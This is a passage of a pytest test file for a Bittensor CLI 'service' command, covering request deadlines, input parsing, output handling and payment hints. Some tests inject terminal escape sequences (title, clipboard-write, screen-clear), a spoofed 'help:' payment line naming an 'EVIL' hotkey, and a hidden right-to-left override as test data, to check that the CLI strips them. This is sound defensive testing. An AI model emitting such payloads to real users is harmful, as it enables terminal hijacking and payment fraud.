                services._send("GET", f"http://127.0.0.1:{port}/", {}, b"", True, 1 << 20, 0.5)
            assert time.monotonic() - started < 2

    @pytest.mark.parametrize(
        "head,body",
        [
            (b"HTTP/1.0 200 OK\r\ncontent-type: application/json\r\n\r\n", b"1,"),
            (b"HTTP/1.0 200 OK\r\n", b"X-A: b\r\n"),
        ],
        ids=["until-close", "headers"],
    )
    def test_a_response_cut_off_at_the_deadline_is_not_a_success(self, head, body):
        with (
            serving(head, body) as url,
            pytest.raises(ServiceError, match=r"did not answer within 0\.5 s"),
        ):
            services._send("GET", url, {}, b"", True, 1 << 20, 0.5)

    def test_a_slow_name_lookup_counts_against_the_deadline(self, monkeypatch):
        def slow(*args, **kwargs):
            time.sleep(3)
            return []

        monkeypatch.setattr(services.socket, "getaddrinfo", slow)
        started = time.monotonic()
        with pytest.raises(ServiceError, match=r"did not answer within 0\.5 s"):
            services._send("GET", "http://slow.example/", {}, b"", True, 1 << 20, 0.5)
        assert time.monotonic() - started < 2

    def test_a_cancelled_call_stops_its_request(self):
        async def cancelled(url):
            with contextlib.suppress(asyncio.TimeoutError):
                await asyncio.wait_for(
                    services._threaded(services._send, "GET", url, {}, b"", True, 1 << 20, 30), 0.3
                )

        with serving(b"HTTP/1.0 200 OK\r\n\r\n", b"x") as url:
            started = time.monotonic()
            asyncio.run(cancelled(url))  # waits for the request's thread
            assert time.monotonic() - started < 2

    @pytest.mark.parametrize("body", [b"", b"abc"])
    def test_a_response_that_ends_early_is_refused(self, body):
        class Reply:
            def read(self, limit):
                return body

        with pytest.raises(ServiceError, match="ended early"):
            services._read(Reply(), 1 << 20, "https://svc.example", {"content-length": "10"})

    @pytest.mark.parametrize(
        "length,code",
        [("-1", "unusable"), ("10,100", "unusable"), ("9" * 6000, "too_large")],
    )
    def test_malformed_or_oversized_lengths_fail_before_reading(self, length, code):
        with pytest.raises(ServiceError) as error:
            services._read(None, 1024, "https://svc.example", {"content-length": length})
        assert error.value.code == code

    def test_a_response_over_the_limit_is_refused(self):
        class Reply:
            def read(self, limit):
                return b"x" * limit

        with pytest.raises(ServiceError, match="over"):
            services._read(Reply(), 1 << 20, "https://svc.example", {})


@contextlib.contextmanager
def serving(head: bytes, trickle: bytes):
    """A url whose host sends ``head`` and then ``trickle`` every 0.1 s for 3 s."""
    with socket.create_server(("127.0.0.1", 0)) as server:

        def answer():
            conn, _ = server.accept()
            conn.recv(1024)
            with contextlib.suppress(OSError):
                conn.sendall(head)
                for _ in range(30):
                    time.sleep(0.1)
                    conn.sendall(trickle)
            conn.close()

        threading.Thread(target=answer, daemon=True).start()
        yield f"http://127.0.0.1:{server.getsockname()[1]}/"


@pytest.fixture()
def cli(request, monkeypatch, web) -> FakeWeb:
    from bittensor.cli import context as cli_context

    request.getfixturevalue("isolated_cli")

    substrate = chain({ALICE_HOT: DOC_URL})
    monkeypatch.setattr(
        cli_context, "Client", lambda network, **_: Client(network, substrate=substrate)
    )
    return web


class TestCli:
    def test_show_reads_a_document_by_its_url_without_the_chain(self, web, monkeypatch, request):
        from bittensor.cli import context as cli_context

        request.getfixturevalue("isolated_cli")

        def no_chain(*args, **kwargs):
            raise AssertionError("the chain was reached")

        monkeypatch.setattr(cli_context, "Client", no_chain)
        result = invoke("service", "show", "--url", DOC_URL)
        assert result.exit_code == 0, result.output
        assert "Example on netuid 1" in result.output
        record = json.loads(invoke("--json", "service", "show", "--url", DOC_URL).output)
        assert (record["netuid"], record["hotkey"]) == (1, ALICE_HOT)
        result = invoke("--json", "service", "show", "--url", DOC_URL, "--netuid", "3")
        assert result.exit_code == 1
        assert "does not list netuid 3" in json.loads(result.output)["error"]
        result = invoke("--json", "service", "show")
        assert result.exit_code == 2 and "btcli service list" in json.loads(result.output)["help"]
        result = invoke("service", "call", "--url", DOC_URL, "create-job", "--model", "m")
        assert result.exit_code == 2 and "read by its url" in result.output
        args = ["--json", "service", "call", "--url", DOC_URL, "get-job", "--id", "j1"]
        dry = invoke(*args, "--x-trace", "t", "--dry-run")
        assert dry.exit_code == 0, dry.output
        assert json.loads(dry.output)["signs"] is True
        assert json.loads(dry.output)["headers"] == ["X-Trace"]
        assert not [sent for sent in web.sent if "/api/v1/" in sent[1]]

    def test_list_shows_usable_services_and_all_says_why_one_is_not(self, cli, monkeypatch):
        from bittensor.cli import context as cli_context

        substrate = every_service({ALICE_HOT: DOC_URL, BOB_HOT: SPEC_URL})
        monkeypatch.setattr(
            cli_context, "Client", lambda network, **_: Client(network, substrate=substrate)
        )
        result = invoke("service", "list")
        assert result.exit_code == 0, result.output
        assert "Example" in result.output and "does not list" not in result.output
        assert "1 more service cannot be used yet; `--all` lists why" in result.output
        result = invoke("service", "list", "--all")
        assert "Example" in result.output and "does not list the publishing hotkey" in result.output
        records = json.loads(invoke("--json", "service", "list").output)
        mine = [r for r in records if r["hotkey"] == ALICE_HOT]
        assert [(r["name"], r["usable"]) for r in mine] == [("Example", True)]
        assert set(mine[0]["operations"]) == {"open", "optional", "hotkey"}
        assert [r["usable"] for r in records if r["url"] == SPEC_URL] == [False]
        assert [r["url"] for r in records if r["problem"]] == [SPEC_URL]

    def test_list_explains_when_every_publisher_is_broken(self, cli, monkeypatch):
        from bittensor.cli import context as cli_context

        substrate = every_service({BOB_HOT: "https://[invalid"})
        monkeypatch.setattr(
            cli_context, "Client", lambda network, **_: Client(network, substrate=substrate)
        )
        result = invoke("service", "list")
        assert result.exit_code == 0 and "--all" in result.output
        result = invoke("service", "list", "--all")
        assert result.exit_code == 0 and "--service-hotkey" in result.output
        assert "Invalid IPv6 URL" in result.output

    def test_show_lists_the_operations(self, cli):
        result = invoke("--json", "service", "show", "--netuid", "1")
        assert result.exit_code == 0, result.output
        record = json.loads(result.output)
        assert record["api"] == "https://svc.example/api/v1"
        ops = {op["operation"]: op for op in record["operations"]}
        assert ops["list-models"]["auth"] == "open" and "input_schema" not in ops["list-models"]
        assert ops["create-job"]["required"] == ["body"]
        assert "limit" in ops["create-job"]["optional"]
        assert f"--service-hotkey {ALICE_HOT}" in record["pay"]
        full = json.loads(invoke("--json", "service", "show", "--netuid", "1", "--schemas").output)
        job = next(op for op in full["operations"] if op["operation"] == "create-job")
        for operation in full["operations"]:
            assert all(
                operation[key] == value for key, value in ops[operation["operation"]].items()
            )
        assert job["input_schema"]["properties"]["body"]["properties"]["model"]["type"] == "string"
        assert job["input_schema"]["required"] == ["body"]

    def test_show_groups_operations_by_tag_in_spec_order(self, cli):
        result = invoke("service", "show", "--netuid", "1")
        assert result.exit_code == 0, result.output
        text = result.output
        jobs, models, other = (
            text.index("jobs: Your jobs"),
            text.index("models"),
            text.index("other"),
        )
        assert jobs < text.index("create-job") < models < text.index("list-models") < other
        assert text.index("get-job") > other
        record = json.loads(invoke("--json", "service", "show", "--netuid", "1").output)
        assert record["tags"] == {"jobs": "Your jobs"}

    def test_show_strips_terminal_controls_from_what_the_service_wrote(self, cli):
        cli.pages[DOC_URL] = document(name="Evil\x1b]0;pwned\x07", description="a\x1b[2Jb")
        result = invoke("service", "show", "--netuid", "1")
        assert result.exit_code == 0, result.output
        assert "\x1b" not in result.output and "Evil]0;pwned" in result.output

    def test_errors_strip_terminal_controls_from_the_spec(self, cli):
        cli.pages[SPEC_URL] = {"swagger": "\x1b]0;pwned\x07"}
        result = invoke("service", "show", "--netuid", "1")
        assert result.exit_code == 1 and "\x1b" not in result.output and "\x07" not in result.output

    def test_a_response_that_is_not_the_json_it_claims_prints_as_text(self, cli):
        cli.pages["https://svc.example/api/v1/models"] = Response(
            200, {"content-type": "application/json"}, b"[[[oops"
        )
        result = invoke("service", "call", "--netuid", "1", "list-models")
        assert result.exit_code == 0 and "[[[oops" in result.output

    def test_operation_help_lists_its_inputs_as_flags(self, cli):
        result = invoke("service", "call", "--netuid", "1", "create-job", "--help")
        assert result.exit_code == 0, result.output
        for text in ("--limit", "INTEGER", "--model", "Model id", "--tags", "--inputs"):
            assert text in result.output
        record = json.loads(
            invoke("--json", "service", "call", "--netuid", "1", "create-job", "--help").output
        )
        assert record["operation"] == "create-job" and record["auth"] == "hotkey"
        assert (
            record["input_schema"]["properties"]["body"]["properties"]["model"]["type"] == "string"
        )
        last = invoke("service", "call", "--netuid", "1", "create-job", "--help", "--json")
        assert json.loads(last.output) == record
        assert not [sent for sent in cli.sent if "/api/v1/" in sent[1]]

    def test_cli_resolves_all_inputs_under_one_budget(self, cli, monkeypatch):
        api = spec()
        api["paths"]["/models"]["get"]["parameters"] = [
            {
                "name": name,
                "in": "query",
                "schema": {"type": "string", "description": "x" * 640},
            }
            for name in ("provider", "region")
        ]
        cli.pages[SPEC_URL] = api
        monkeypatch.setattr(services, "RESOLVE_BUDGET", 24)
        args = ("service", "call", "--netuid", "1", "list-models")
        assert invoke(*args, "--provider", "abc", "--dry-run").exit_code == 0
        for options in (
            ("--help",),
            ("--provider", "abc", "--region", "us", "--dry-run"),
        ):
            result = invoke(*args, *options)
            assert result.exit_code == 1 and "input schema is too large" in result.stderr
        assert invoke("--json", *args, "--help").exit_code == 0
        assert not any(url.endswith("/api/v1/models") for _, url, _, _ in cli.sent)

    def test_inputs_are_flags_typed_by_the_spec(self, cli, tmp_path):
        cli.pages["https://svc.example/api/v1/jobs"] = {"id": "j1"}
        inputs = tmp_path / "inputs.json"
        inputs.write_text('{"dry_run":true}')
        result = invoke(
            "service", "call", "--netuid", "1", "create-job",
            "--limit", "2", "--model", "@handle", "--tags", "a", "--tags=b",
            "--inputs", f"@{inputs}",
        )  # fmt: skip
        assert result.exit_code == 0, result.output
        _, url, _, data = cli.sent[-1]
        assert url.endswith("/jobs?limit=2")
        assert json.loads(data) == {"model": "@handle", "tags": ["a", "b"], "dry_run": True}
        assert caller(cli.sent[-1], load()).hotkey_ss58 == wallet_hotkey()

    def test_reserved_controls_are_effective_before_inputs_or_signing(self, cli):
        result = invoke(
            "service", "call", "--netuid", "1", "create-job", "--model", "m", "--dry-run", "--json"
        )
        assert result.exit_code == 0, result.output
        assert json.loads(result.stdout)["dry_run"]
        result = invoke(
            "service",
            "call",
            "--netuid",
            "1",
            "create-job",
            "--model",
            "@/does/not/exist",
            "--help",
        )
        assert result.exit_code == 0, result.output
        result = invoke("service", "call", "--netuid", "1", "missing-op", "--json")
        assert json.loads(result.stderr)["code"] == "input"
        for timeout in ["-1", "nan", "inf", "1e300"]:
            result = invoke("service", "call", "--netuid", "1", "create-job", "--timeout", timeout)
            assert result.exit_code == 2 and "--timeout" in result.output
        assert not [sent for sent in cli.sent if "/api/v1/" in sent[1]]

    def test_nullable_array_and_mixed_choices_preserve_input_types(self, cli):
        api = spec()
        fields = api["components"]["schemas"]["Job"]["properties"]
        fields["tags"] = {"type": ["array", "null"], "items": {"type": "string"}}
        fields["mode"] = {"anyOf": [{"const": "auto"}, {"type": "integer"}]}
        cli.pages[SPEC_URL] = api
        cli.pages["https://svc.example/api/v1/jobs"] = {}
        result = invoke(
            "service",
            "call",
            "--netuid",
            "1",
            "create-job",
            "--tags=null",
            "--mode=5",
            '--model="quoted"',
        )
        assert result.exit_code == 0, result.output
        assert json.loads(cli.sent[-1][3]) == {"tags": None, "mode": 5, "model": '"quoted"'}

    def test_inspection_and_unsigned_calls_reserve_their_controls(self, cli, monkeypatch):
        from bittensor.cli.commands import services as commands

        def no_wallet(*args, **kwargs):
            pytest.fail("this command must never request a signing key")

        monkeypatch.setattr(commands, "_hotkey", no_wallet)
        fixture = spec()
        fixture["paths"]["/sample"] = {
            "post": {
                "operationId": "sample",
                "security": [{"btauth": []}, {}],
                "parameters": [
                    {"name": key, "in": "query", "schema": {"type": "boolean"}}
                    for key in ("help", "unsigned")
                ],
            }
        }
        cli.pages[SPEC_URL] = fixture
        endpoint = "https://svc.example/api/v1/sample"
        cli.pages[endpoint] = {}
        args = ["service", "call", "--netuid", "1", "sample"]
        for argv in (["--dry-run", *args], [*args, "--help"]):
            result = invoke(*argv)
            assert result.exit_code == 0, result.output
            assert all(method != "POST" for method, *_ in cli.sent)
        result = invoke(*args, "--unsigned", "--inputs", '{"help":true,"unsigned":false}')
        assert result.exit_code == 0, result.output
        method, url, headers, _ = cli.sent[-1]
        assert method == "POST" and url == endpoint + "?help=true&unsigned=false"
        assert http_auth.HEADER_SIGNATURE not in headers

    def test_tool_schema_round_trips_colliding_body_and_parameter_names(self, cli):
        api = spec()
        api["paths"]["/jobs"]["post"]["parameters"] = [
            {"name": "body", "in": "query", "schema": {"type": "string"}}
        ]
        api["components"]["schemas"]["Job"]["properties"]["help"] = {"type": "boolean"}
        cli.pages[SPEC_URL] = api
        cli.pages["https://svc.example/api/v1/jobs"] = {}
        args = ["service", "call", "--netuid", "1", "create-job"]
        definition = json.loads(invoke(*args, "--help", "--json").stdout)
        properties = definition["input_schema"]["properties"]
        name = next(name for name, schema in properties.items() if "properties" in schema)
        body = {"model": "m", "help": True, "x": [None, {}]}
        values = {"body": "query", name: body}
        called = invoke(*args, "--inputs", json.dumps(values))
        assert called.exit_code == 0, called.output
        assert cli.sent[-1][1].endswith("?body=query") and json.loads(cli.sent[-1][3]) == body

    def test_dry_run_cannot_be_consumed_as_an_output_filename(self, cli):
        result = invoke("service", "call", "--netuid", "1", "list-models", "--out", "--dry-run")
        assert result.exit_code == 2
        assert not [sent for sent in cli.sent if "/api/v1/" in sent[1]]

    def test_btcli_options_and_inputs_never_clash(self, cli):
        cli.pages["https://svc.example/api/v1/jobs"] = {"id": "j1"}
        result = invoke("service", "call", "--netuid", "1", "createJob", "--model=--netuid")
        assert result.exit_code == 0, result.output
        assert json.loads(cli.sent[-1][3]) == {"model": "--netuid"}

    def test_an_input_that_is_text_or_a_list_takes_text_once(self, cli):
        cli.pages["https://svc.example/api/v1/jobs"] = {"id": "j1"}
        result = invoke(
            "service", "call", "--netuid", "1", "create-job", "--model", "m", "--input", "hi"
        )
        assert result.exit_code == 0, result.output
        assert json.loads(cli.sent[-1][3]) == {"model": "m", "input": "hi"}

    def test_an_array_input_is_repeated_or_a_json_array(self, cli):
        cli.pages["https://svc.example/api/v1/jobs"] = {"id": "j1"}
        args = ["create-job", "--model", "m", "--tags", "a", "--tags", '["b", "c"]']
        result = invoke("service", "call", "--netuid", "1", *args)
        assert result.exit_code == 0, result.output
        assert json.loads(cli.sent[-1][3])["tags"] == ["a", "b", "c"]

    @pytest.mark.parametrize(
        "args,error",
        [
            (["create-job", "--page", "1"], "has no input '--page'"),
            (["create-job"], "model"),
            (["create-job", "--model", "m", "--limit", "two"], "--limit takes INTEGER"),
            (["create-job", "--model", "m", "--limit", "NaN"], "--limit takes INTEGER"),
            (["create-job", "--model", "m", "--model", "n"], "given twice"),
            (["create-job", "--model"], "needs a value"),
            (["create-job", "--no-model"], "--no-model takes no value"),
            (["create-job", "--inputs", "[1]"], "--inputs takes a JSON object"),
            (["create-job", "--inputs", '{"modle": "m"}'], "did you mean model"),
            (["create-job", "--inputs", "@/no/such/file"], "cannot read"),
            (["creat-job"], "no operation 'creat-job' at Example; did you mean create-job"),
        ],
        ids=[
            "unknown", "missing", "type", "nan", "twice", "no-value", "no-flag", "not-object",
            "json-typo", "file", "typo",
        ],
    )  # fmt: skip
    def test_bad_inputs_are_refused_before_any_request(self, cli, args, error):
        result = invoke("service", "call", "--netuid", "1", *args)
        assert result.exit_code == 2
        assert error in " ".join(result.output.split())
        assert not [sent for sent in cli.sent if "/api/v1/" in sent[1]]

    def test_an_object_shows_as_fields_and_a_list_as_a_table(self, cli):
        cli.pages["https://svc.example/api/v1/jobs/j1"] = {
            "id": "j1",
            "status": "done",
            "note": None,
        }
        fields = invoke("service", "call", "--netuid", "1", "get-job", "--id", "j1")
        assert fields.exit_code == 0 and "done" in fields.output
        assert "note null" in " ".join(fields.output.split())
        cli.pages["https://svc.example/api/v1/jobs"] = [{"id": "j1", "gpu": "RTX"}]
        table = invoke("service", "call", "--netuid", "1", "list-jobs")
        assert table.exit_code == 0 and "Jobs" in table.output and "RTX" in table.output
        raw = invoke("--json", "service", "call", "--netuid", "1", "list-jobs")
        answer = json.loads(raw.output)
        assert answer["body"] == [{"id": "j1", "gpu": "RTX"}]
        assert (answer["status"], answer["signed"]) == (200, wallet_hotkey())
        wide = [{f"f{n}": n for n in range(10)} | {"id": "j9"}] * 4
        cli.pages["https://svc.example/api/v1/jobs"] = wide
        whole = invoke("service", "call", "--netuid", "1", "list-jobs")
        assert whole.exit_code == 0 and yaml.safe_load(whole.output) == wide
        cli.pages["https://svc.example/api/v1/jobs"] = []
        empty = invoke("service", "call", "--netuid", "1", "list-jobs")
        assert empty.exit_code == 0 and "none" in empty.output

    def test_call_an_open_operation_needs_no_wallet_key(self, cli):
        cli.pages["https://svc.example/api/v1/models"] = {"data": ["m"]}
        result = invoke("service", "call", "--netuid", "1", "list-models")
        assert result.exit_code == 0, result.output
        assert http_auth.HEADER_SIGNATURE not in cli.sent[-1][2]

    def test_a_new_call_checks_the_current_publisher(self, cli, monkeypatch):
        from bittensor.cli import context as cli_context

        assert invoke("service", "show", "--netuid", "1").exit_code == 0
        removed = chain({})
        monkeypatch.setattr(
            cli_context, "Client", lambda network, **_: Client(network, substrate=removed)
        )
        result = invoke("--json", "service", "call", "--netuid", "1", "list-jobs")
        assert result.exit_code == 1 and json.loads(result.output)["code"] == "no_service"
        assert all(http_auth.HEADER_SIGNATURE not in request[2] for request in cli.sent)

    def test_balance_does_not_fetch_the_api_spec(self, cli):
        cli.pages[SPEC_URL] = Response(503, {}, b"")
        cli.pages[BALANCE_URL] = {"hotkey": BOB_HOT, "remaining_usd": "0"}
        result = invoke("--json", "service", "balance", "--netuid", "1", "--hotkey", BOB_HOT)
        assert result.exit_code == 0, result.output
        assert fetches(cli, SPEC_URL) == 0

    def test_a_402_says_how_to_pay(self, cli):
        cli.pages["https://svc.example/api/v1/jobs"] = Response(
            402, {"content-type": "application/json"}, b'{"error":"insufficient_balance"}'
        )
        result = invoke("service", "call", "--netuid", "1", "list-jobs")
        assert result.exit_code == 1
        assert "HTTP 402 from Example" in result.output
        text = " ".join(result.output.split())
        assert f"gamma spend --netuid 1 --service-hotkey {ALICE_HOT}" in text
        assert text.endswith("--amount-gamma AMOUNT") and f"-w {_WALLET_NAME}" in text

    def test_the_pay_hint_names_a_network_that_is_not_the_default(self, cli):
        cli.pages["https://svc.example/api/v1/jobs"] = Response(
            402, {"content-type": "application/json"}, b'{"error":"insufficient_balance"}'
        )
        result = invoke("--network", "test", "service", "call", "--netuid", "1", "list-jobs")
        assert "btcli --network test -w testwallet gamma spend --netuid 1" in " ".join(
            result.output.split()
        )

    def test_an_answer_of_several_lines_keeps_them(self, cli):
        answer = {
            "id": "c1",
            "choices": [{"index": 0, "message": {"content": "one\n- two\n- 안녕하세요"}}],
        }
        cli.pages["https://svc.example/api/v1/models"] = answer
        result = invoke("service", "call", "--netuid", "1", "list-models")
        assert result.exit_code == 0, result.output
        assert "content: |-\n      one\n      - two\n      - 안녕하세요\n" in result.output
        assert yaml.safe_load(result.output) == answer

    def test_an_error_shows_the_message_the_service_sent(self, cli):
        cli.pages["https://svc.example/api/v1/jobs/j2"] = Response(
            404, {"content-type": "application/json"}, b'{"error":{"message":"no job j2"}}'
        )
        result = invoke("service", "call", "--netuid", "1", "get-job", "--id", "j2")
        assert result.exit_code == 1
        assert (
            "HTTP 404 from Example" in result.output
            and "note: the service says: no job j2" in result.output
        )

    def test_a_binary_response_goes_to_out(self, cli, tmp_path):
        cli.pages["https://svc.example/api/v1/models"] = Response(
            200, {"content-type": "video/mp4"}, b"\x00\x01"
        )
        out = tmp_path / "video.mp4"
        result = invoke("service", "call", "--netuid", "1", "--out", str(out), "list-models")
        assert result.exit_code == 0, result.output
        assert out.read_bytes() == b"\x00\x01"

    def test_output_commit_failure_keeps_the_old_file_and_complete_response(
        self, cli, tmp_path, monkeypatch
    ):
        data = b"new paid response"
        cli.pages["https://svc.example/api/v1/jobs"] = Response(200, {}, data)
        out = tmp_path / "existing"
        out.write_bytes(b"old")

        def refused(source, target):
            raise PermissionError("destination changed")

        monkeypatch.setattr(Path, "replace", refused)
        result = invoke(
            "--json", "service", "call", "--netuid", "1", "list-jobs", "--out", str(out)
        )
        assert result.exit_code == 1, result.output
        error = json.loads(result.output)
        assert error["code"] == "output" and out.read_bytes() == b"old"
        assert Path(error["out"]).read_bytes() == data

    def test_failing_call_leaves_output_directory_untouched(self, cli, tmp_path):
        cli.pages["https://svc.example/api/v1/jobs"] = Response(503, {}, b"busy")
        folder = tmp_path / "output"
        folder.mkdir()
        result = invoke(
            "service", "call", "--netuid", "1", "list-jobs", "--out", str(folder / "result")
        )
        assert result.exit_code == 1 and not list(folder.iterdir())

    def test_terminal_json_preserves_distinct_keys_and_escapes_format_characters(self, capsys):
        from rich.console import Console

        from bittensor.cli.output import Output

        output = Output(json_mode=True)
        output._out = Console(force_terminal=True, color_system=None)
        payload = {"name": 1, "na\u202eme": 2}
        output.value(payload)
        text = capsys.readouterr().out
        assert "\u202e" not in text and json.loads(text) == payload

    def test_headerless_binary_response_is_kept(self, cli):
        data = b"model\x00data"
        cli.pages["https://svc.example/api/v1/models"] = Response(200, {}, data)
        result = invoke("--json", "service", "call", "--netuid", "1", "list-models")
        assert result.exit_code == 0, result.output
        path = Path(json.loads(result.output)["out"])
        try:
            assert path.read_bytes() == data
        finally:
            path.unlink()

    def test_large_nested_responses_preserve_every_row(self, cli):
        rows = [{"machine": {"model": "Xeon"}}] * 51
        cli.pages["https://svc.example/api/v1/jobs"] = rows
        result = invoke("service", "call", "--netuid", "1", "list-jobs")
        assert result.exit_code == 0 and yaml.safe_load(result.output) == rows

    def test_balance_is_signed_by_the_wallet_hotkey(self, cli):
        hotkey = wallet_hotkey()
        cli.pages[f"{BALANCE_URL}?hotkey={hotkey}"] = signed_only(
            {"hotkey": hotkey, "remaining_usd": "2.50"}
        )
        result = invoke("--json", "service", "balance", "--netuid", "1")
        assert result.exit_code == 0, result.output
        assert json.loads(result.output)["remaining_usd"] == "2.50"
        assert caller(cli.sent[-1], load()).hotkey_ss58 == hotkey

    def test_call_without_an_operation_lists_them(self, cli):
        result = invoke("service", "call", "--netuid", "1")
        assert result.exit_code == 0 and "create-job" in result.output

    def test_btcli_options_may_follow_the_operation(self, cli, tmp_path):
        cli.pages["https://svc.example/api/v1/models"] = {"data": ["m"]}
        result = invoke("service", "call", "list-models", "--netuid", "1", "--json")
        assert result.exit_code == 0, result.output
        assert json.loads(result.output)["body"] == {"data": ["m"]}
        out = tmp_path / "models.json"
        result = invoke("service", "call", "--netuid", "1", "list-models", "--out", str(out))
        assert result.exit_code == 0 and json.loads(out.read_text()) == {"data": ["m"]}
        result = invoke("service", "call", "--netuid", "1", "list-models", "--wallet", "x")
        assert result.exit_code == 0, result.output
        result = invoke("--json", "service", "call", "--netuid", "1", "list-jobs", "-H", "nosuch")
        assert result.exit_code == 1 and json.loads(result.output)["code"] == "wallet"
        assert "'nosuch'" in json.loads(result.output)["error"]
        result = invoke("service", "call", "--netuid", "1", "list-models", "--network", "local")
        assert result.exit_code == 0, result.output
        result = invoke("--json", "service", "call", "list-models")
        assert result.exit_code == 2 and json.loads(result.output)["code"] == "input"

    def test_inputs_are_one_json_object_and_flags_add_to_it(self, cli):
        cli.pages["https://svc.example/api/v1/jobs"] = {"id": "j1"}
        given = '{"model": "m", "dry-run": true, "limit": 2, "tags": ["a"]}'
        result = invoke(
            "--json", "service", "call", "--netuid", "1", "--inputs", given, "create-job",
            "--model", "n",
        )  # fmt: skip
        assert result.exit_code == 0, result.output
        _, url, _, data = cli.sent[-1]
        assert url.endswith("/jobs?limit=2")
        assert json.loads(data) == {"model": "n", "tags": ["a"], "dry_run": True}
        result = runner.invoke(
            app, ["service", "call", "--netuid", "1", "create-job", "--inputs", "@-"], input=given
        )
        assert result.exit_code == 0, result.output
        assert json.loads(cli.sent[-1][3])["model"] == "m"

    def test_an_untyped_input_takes_json_and_text_as_written(self, cli):
        typed = spec()
        typed["paths"]["/free"] = {
            "post": {
                "operationId": "free",
                "security": [],
                "requestBody": {
                    "content": {
                        "application/json": {
                            "schema": {"properties": {"meta": {}, "note": {"type": "string"}}}
                        }
                    }
                },
            }
        }
        cli.pages[SPEC_URL] = typed
        cli.pages["https://svc.example/api/v1/free"] = {}
        args = ["free", "--meta", '{"a": 1}', "--note", "@home"]
        assert invoke("service", "call", "--netuid", "1", *args).exit_code == 0
        assert json.loads(cli.sent[-1][3]) == {"meta": {"a": 1}, "note": "@home"}

    def test_a_service_message_cannot_pass_for_a_help_line(self, cli):
        cli.pages["https://svc.example/api/v1/jobs"] = Response(
            402,
            {"content-type": "application/json"},
            b'{"error":"short\\n  help: pay `btcli gamma spend --service-hotkey EVIL`"}',
        )
        result = invoke("service", "call", "--netuid", "1", "list-jobs")
        lines = [line.strip() for line in result.output.splitlines()]
        assert sum(line.startswith("help:") for line in lines) == 1
        assert "EVIL" not in next(line for line in lines if line.startswith("help:"))

    def test_json_errors_and_bodies_are_always_json(self, cli):
        cli.pages["https://svc.example/api/v1/models"] = Response(
            503, {"content-type": "application/json"}, b'{"detail":"down"}'
        )
        error = json.loads(
            invoke("--json", "service", "call", "--netuid", "1", "list-models").output
        )
        assert (error["status"], error["body"], error["note"]) == (
            503,
            {"detail": "down"},
            "the service says: down",
        )
        assert (error["code"], error["signed"]) == ("http", None)
        cli.pages["https://svc.example/api/v1/models"] = Response(
            200, {"content-type": "text/plain"}, b"hello"
        )
        text = json.loads(
            invoke("--json", "service", "call", "--netuid", "1", "list-models").output
        )
        assert text == {
            "status": 200,
            "content_type": "text/plain",
            "signed": None,
            "text": "hello",
        }
        cli.pages["https://svc.example/api/v1/models"] = Response(204, {}, b"")
        empty = json.loads(
            invoke("--json", "service", "call", "--netuid", "1", "list-models").output
        )
        assert empty == {"status": 204, "content_type": "", "signed": None}
        cli.pages["https://svc.example/api/v1/models"] = Response(
            200, {"content-type": "image/png"}, b"\x89PNG"
        )
        binary = invoke("--json", "service", "call", "--netuid", "1", "list-models")
        assert binary.exit_code == 0, binary.output
        saved = json.loads(binary.output)
        assert saved["bytes"] == 4 and Path(saved["out"]).read_bytes() == b"\x89PNG"
        Path(saved["out"]).unlink()

    def test_a_missing_hotkey_is_reported_before_the_chain(self, cli):
        result = invoke("service", "call", "--netuid", "1", "-H", "nosuch", "list-jobs")
        assert result.exit_code == 1
        assert (
            "cannot use hotkey 'nosuch'" in result.output and "could not reach" not in result.output
        )

    def test_balance_without_one_says_how_to_pay(self, cli):
        hotkey = wallet_hotkey()
        cli.pages[f"{BALANCE_URL}?hotkey={hotkey}"] = Response(
            402, {"content-type": "application/json"}, b'{"error":"insufficient_balance"}'
        )
        result = invoke("service", "balance", "--netuid", "1")
        assert result.exit_code == 1 and "HTTP 402" in result.output
        assert "gamma spend --netuid 1" in " ".join(result.output.split())
        cli.pages[f"{BALANCE_URL}?hotkey={BOB_HOT}"] = cli.pages[f"{BALANCE_URL}?hotkey={hotkey}"]
        other = invoke("service", "balance", "--netuid", "1", "--hotkey", BOB_HOT)
        assert other.exit_code == 1 and "gamma spend" not in other.output

    def test_a_public_balance_is_read_without_preparing_a_signer(self, cli, monkeypatch):
        hotkey = wallet_hotkey()
        cli.pages[f"{BALANCE_URL}?hotkey={hotkey}"] = {"hotkey": hotkey, "remaining_usd": "1"}

        async def no_signer(*args, **kwargs):
            raise AssertionError("a signer was prepared")

        monkeypatch.setattr(http_auth, "prepare_signer", no_signer)
        result = invoke("--json", "service", "balance", "--netuid", "1")
        assert result.exit_code == 0, result.output
        assert http_auth.HEADER_SIGNATURE not in cli.sent[-1][2]

    def test_a_text_response_reaches_the_terminal_without_controls(self, cli):
        cli.pages["https://svc.example/api/v1/models"] = Response(
            200, {"content-type": "text/plain"}, b"hi\x1b]52;c;aGk=\x07\x1b[2J\xc2\x9bbye"
        )
        result = invoke("service", "call", "--netuid", "1", "list-models")
        assert result.exit_code == 0 and "hi" in result.output and "bye" in result.output
        assert not any(ch in result.output for ch in "\x1b\x07\x9b")

    def test_a_binary_response_is_kept_in_a_file_not_printed(self, cli):
        cli.pages["https://svc.example/api/v1/models"] = Response(
            200, {"content-type": "image/png"}, b"\x89PNG\x1b[2J"
        )
        result = invoke("service", "call", "--netuid", "1", "list-models")
        assert result.exit_code == 0 and "\x1b" not in result.output
        text = " ".join(result.output.split())
        assert "bytes 8" in text and "content type image/png" in text
        Path(re.search(r"out(\S+?)bytes", "".join(text.split()))[1]).unlink()

    def test_a_file_input_takes_a_file_only_through_file(self, cli, tmp_path):
        upload = {
            "type": "object",
            "required": ["audio"],
            "properties": {
                "audio": {"type": "string", "format": "binary"},
                "model": {"type": "string"},
            },
        }
        cli.pages[SPEC_URL] = with_operation(
            "/transcribe",
            "post",
            {
                "operationId": "transcribe",
                "requestBody": {
                    "required": True,
                    "content": {"multipart/form-data": {"schema": upload}},
                },
            },
        )
        cli.pages["https://svc.example/api/v1/transcribe"] = {"text": "hi"}
        audio = tmp_path / "talk.png"
        audio.write_bytes(b"PNG")
        help_text = " ".join(
            invoke("service", "call", "--netuid", "1", "transcribe", "-h").output.split()
        )
        assert "--file audio=PATH FILE yes" in help_text
        refused = invoke("service", "call", "--netuid", "1", "transcribe", "--audio", str(audio))
        assert refused.exit_code == 2 and "--file audio=PATH" in refused.output
        result = invoke(
            "service",
            "call",
            "--netuid",
            "1",
            "transcribe",
            "--model",
            "m",
            "--file",
            f"audio={audio}",
        )
        assert result.exit_code == 0, result.output
        headers, data = cli.sent[-1][2], cli.sent[-1][3]
        parts = multipart_body(data, headers["Content-Type"].partition("boundary=")[2])
        assert (
            {
                "Content-Disposition": 'form-data; name="audio"; filename="talk.png"',
                "Content-Type": "image/png",
            },
            b"PNG",
        ) in parts
